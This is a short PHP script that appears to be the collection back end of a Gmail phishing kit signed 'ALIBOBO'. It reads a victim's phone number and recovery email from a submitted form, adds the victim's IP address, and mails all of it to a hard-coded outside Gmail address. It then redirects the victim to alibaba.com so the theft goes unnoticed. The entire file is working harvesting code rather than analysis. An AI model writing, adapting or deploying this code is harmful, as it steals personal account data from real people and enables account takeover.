<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------Gmail Result-----------------------\n";
$message .= "Phone: ".$_POST['phoneNumber']."\n";
$message .= "Email recovery: ".$_POST['recEmail']."\n";

$message .= "IP: ".$ip."\n";
$message .= "---------------Created By ALIBOBO----------------------------\n";


$recipient = "willism229@gmail.com";
$subject = "New Message From ALIBOBO";
 mail("$to", " Login", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: http://www.alibaba.com");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>